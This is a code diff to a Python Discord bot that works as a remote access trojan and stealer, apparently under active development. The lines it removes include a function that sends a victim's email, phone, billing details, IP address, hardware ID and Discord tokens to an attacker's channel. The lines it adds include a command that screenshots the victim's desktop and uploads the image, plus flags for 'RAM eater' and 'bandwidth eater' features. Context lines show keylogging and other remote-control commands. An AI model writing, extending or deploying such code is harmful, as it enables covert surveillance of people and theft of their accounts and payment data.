@@ -95,6 +95,8 @@ embeds_to_send = []
 channel_ids = {'main': 1338130695054168094, 'spam': 1338130619825258526}
 text_buffer = ''
 user_name = os.getenv("UserName")
+ram_eater_active = False
+bandwidth_eater_active = False
 
 keycodes = {
     Key.space: '',  
@@ -330,48 +332,6 @@ def try_extract(func):
             except Exception:
                 pass
         return wrapper
-
-
-
-async def send_embed(email, phone, nitro, billing, ip, pc_username, pc_name, platform, user_path_name, hwid, token, tokens, username, user_id):
-    embed = discord.Embed(
-        color=0x7289da,
-        title="Republic of Wadiya Intelligence Report",
-        description="Details about the moga's account and system."
-    )
-
-
-    embed.add_field(
-        name="|Account Info|",
-        value=f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-        inline=True
-    )
-    embed.add_field(
-        name="|PC Info|",
-        value=f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}\nUser Path: {user_path_name}',
-        inline=True
-    )
-    embed.add_field(
-        name="|More Info|",
-        value=f"HWID: {hwid}\nToken: {token}",
-        inline=False
-    )
-    embed.add_field(
-        name="**Tokens:**",
-        value=f"```yaml\n{tokens if tokens else 'No tokens extracted'}\n```",
-        inline=False
-    )
-
-    embed.set_author(
-        name=username,
-        icon_url=f"https://cdn.discordapp.com/avatars/{user_id}.png?size=32"
-    )
-    embed.set_footer(text="Zitemaker")
-
-
-    channel = bot.get_channel(1335115941444587614)
-    await channel.send(embed=embed)
-
 
 def debug(message):
     print(f"[DEBUG] {message}")
@@ -646,6 +606,41 @@ async def msgbox(ctx, inputid, title, *, msg):
             await ctx.send(f'Sorry, couldn\'t find the user {inputid}.')
             
 
+@bot.event
+async def on_message(message):
+    if message.author == bot.user:
+        return
+
+
+    if message.content.startswith("!screenshot"):
+        try:
+
+            parts = message.content.split(" ", 1)
+            if len(parts) < 2:
+                return
+            
+            requested_user = parts[1].strip()
+            local_user = os.getenv("UserName")
+
+
+            if requested_user.lower() == local_user.lower():
+
+                screenshot_path = "screenshot.png"
+                screenshot = pyautogui.screenshot()
+                screenshot.save(screenshot_path)
+
+
+                await message.channel.send(file=discord.File(screenshot_path))
+
+
+                await asyncio.sleep(3)
+                os.remove(screenshot_path)
+        except Exception as e:
+            print(f"Error: {e}")
+
+    await bot.process_commands(message)
+
+"""
 @bot.command(name='screenshot')
 async def screenshot(ctx, inputid):
     if inputid == name:
@@ -656,7 +651,7 @@ async def screenshot(ctx, inputid):
             xdisplay=None
         )
         random_string = get_random_string(6)
-        fname = f'screenshot_{name}.png'
+        fname = f'screenshot_{random_string}.png'
         image.save(fname)
         await ctx.send(file=discord.File(fname))
         await ctx.send(f'Screenshot `{fname}` from process {name} was sent.')
@@ -676,6 +671,7 @@ async def screenshot(ctx, inputid):
             os.remove(fname)
         if inputid != 'all' and name:
             await ctx.send(f'Sorry, couldn\'t find the user {inputid}.')
+"""            
 
 
 @bot.command(name='wallpaper')
